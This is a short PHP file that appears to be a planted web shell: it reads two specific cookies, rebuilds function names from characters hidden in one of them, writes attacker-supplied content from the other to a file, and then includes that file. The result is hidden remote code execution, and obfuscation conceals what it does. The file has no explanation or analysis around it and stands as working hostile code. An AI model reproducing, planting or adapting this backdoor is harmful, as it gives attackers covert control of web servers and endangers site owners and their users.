<?php
if (isset($_COOKIE[3]) && isset($_COOKIE[21])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 3;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[21][$n];
        if (!$c[21][$n + 1]) {
            if (!$c[21][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 3 + 1;
    }
    $k = $p[25]() . $p[28];
    if (!$p[2]($k)) {
        $n = $p[16]($k, $p[5]);
        $p[11]($n, $p[18] . $p[24]($p[6]($c[3])));
    }
    include($k);
}